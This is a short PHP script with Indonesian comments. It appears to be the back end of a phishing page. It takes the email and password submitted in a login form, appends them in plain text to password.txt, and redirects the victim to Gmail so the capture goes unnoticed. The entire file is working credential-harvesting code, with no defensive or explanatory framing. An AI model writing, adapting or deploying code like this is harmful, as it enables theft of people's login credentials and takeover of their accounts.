<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['email'];
    $password = $_POST['password'];

    // Simpan data login ke dalam file password.txt
    $file = fopen("password.txt", "a");
    fwrite($file, "Username/Email: " . $username . " - Password: " . $password . "\n");
    fclose($file);

    // Redirect ke halaman lain setelah login
    header("Location: https://mail.google.com");
    exit();
}
?>
